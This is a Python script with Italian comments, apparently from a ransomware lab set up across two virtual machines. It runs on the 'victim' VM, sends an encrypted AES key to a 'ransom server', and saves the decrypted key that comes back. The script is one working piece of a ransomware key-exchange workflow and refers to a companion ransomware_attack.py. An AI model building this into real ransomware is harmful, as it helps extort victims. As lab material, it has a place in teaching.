#(L'Invio del Riscatto su VM 2)
#Questo script funge da client di comunicazione per inviare la chiave cifrata al server.
# client_send_key.py - Eseguito su VM 2 (Vittima) per inviare la chiave cifrata

import socket
import os
import sys

# --- Configurazione ---
# Sostituisci "IP_VM1_SERVER" con l'indirizzo IP effettivo della VM 1
HOST = "IP_VM1_SERVER" 
PORT = 8082
ENCRYPTED_KEY_FILE = os.path.join("test_files", "encryptedSymmertricKey.key")
DECRYPTED_KEY_OUTPUT = os.path.join("test_files", "decrypted_key_from_server.key")

def main():
    """Routine principale del client per l'invio della chiave cifrata."""
    if HOST == "IP_VM1_SERVER":
        print("❌ ERRORE: Modifica il file 'client_send_key.py' e imposta l'indirizzo IP del server (VM 1).")
        return
        
    server_address = (HOST, PORT)
    
    # (1) Lettura della chiave AES cifrata da inviare
    try:
        with open(ENCRYPTED_KEY_FILE, "rb") as f:
            encrypted_data = f.read()
        print(f"File '{ENCRYPTED_KEY_FILE}' letto ({len(encrypted_data)} bytes).")
    except FileNotFoundError:
        print(f"❌ Errore: Chiave cifrata non trovata. Eseguire prima 'ransomware_attack.py'.")
        return

    # (2) Connessione al server e invio
    try:
        with socket.create_connection(server_address, timeout=5) as sock:
            print(f"✅ Connesso al server di riscatto {HOST}:{PORT}")
            
            sock.sendall(encrypted_data)
            print("📤 Chiave AES cifrata inviata.")
            
            # (3) Ricezione della risposta (dovrebbe essere la chiave AES decifrata)
            decrypted_key = b""
            while True:
                part = sock.recv(4096)
                if not part:
                    break
                decrypted_key += part
            
            if decrypted_key.startswith(b"ERROR"):
                 print(f"❌ Errore dal server durante la decifratura: {decrypted_key.decode()}")
                 return
                 
            print(f"📥 Chiave AES originale decifrata ricevuta ({len(decrypted_key)} bytes).")
            
            # (4) Salvataggio della chiave AES decifrata, pronta per il ripristino
            with open(DECRYPTED_KEY_OUTPUT, "wb") as f:
                f.write(decrypted_key)
            print(f"✅ Chiave AES decifrata salvata in '{DECRYPTED_KEY_OUTPUT}'.")

    except ConnectionRefusedError:
        print("❌ Errore: Connessione rifiutata. Avviare il server (VM 1) o verificare l'IP.")
    except Exception as e:
        print(f"❌ Errore di connessione o trasferimento dati: {e}")

if __name__ == "__main__":
    main()
